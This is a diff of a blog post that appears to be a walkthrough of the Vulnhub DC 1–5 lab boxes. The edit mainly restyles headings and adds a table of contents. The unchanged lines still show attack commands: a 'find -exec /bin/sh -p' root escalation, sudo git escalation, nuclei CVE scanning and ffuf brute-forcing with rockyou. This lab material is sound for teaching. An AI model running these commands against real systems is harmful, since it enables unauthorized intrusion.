@@ -9,9 +9,19 @@ image: /assets/img/posts/vulnhub.webp
 excerpt: "Vulnhub Hacking Boxes..."
 ---
 
-## DC Series Learning...
+## DC Series Learning Guide
 
-# DC 1
+This comprehensive guide covers exploitation techniques for the Vulnhub DC series. Each box focuses on different vulnerabilities and post-exploitation methods.
+
+### Table of Contents
+1. [DC 1 - Drupal 7](#dc-1-drupal-7)
+2. [DC 2 - WordPress 4.7.10](#dc-2-wordpress)
+3. [DC 3 - Joomla 3.7.0](#dc-3-joomla)
+4. [DC 4 - SSH Brute Force](#dc-4-ssh)
+5. [DC 5 - Log Poisoning](#dc-5-log-poisoning)
+
+
+## DC 1
 ```bash
 # Exploiting CMS Drupal 7 using msf
 # msf >  search about drupal 7 Exploits and Auxiliaries.
@@ -25,7 +35,7 @@ find . -exec /bin/sh -p \; -quit
 # bling bling !!!
 ```
 
-# DC 2
+## DC 2
 ```bash
 # Exploiting CMS --> Wordpress 4.7.10
 # Password file creation ?
@@ -58,7 +68,7 @@ sudo git help add
 # bling bling !!!
 ```
 
-# DC 3
+## DC 3
 ```bash
 # Exploiting Joomla 3.7.0 Version
  Explore msf usage for joomla exploitation , get used exploit and auxilaries
@@ -85,7 +95,7 @@ nuclei -u $URL -t /root/nuclei-templates/http/cves/ -tags joomla
 # bling bling !!!
 ```
 
-# DC 4
+## DC 4
 ```bash
 - Brute force login pages   --> ffuf , burp , caido 
    * ffuf -request req.txt -request-proto http -w /usr/share/wordlists/rockyou.txt -fs 206
@@ -114,7 +124,7 @@ pwned user --> User Discription
 # bling bling !!!
 ```
 
-# DC 5
+## DC 5
 ```bash
 # Parameter Fuzzing
   * ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt  -u http://$IP/thankyou.php?FUZZ=test -e .php,.html,.txt,.js,.json,.xml,.bak,.old,.log -t 50 -fw 30
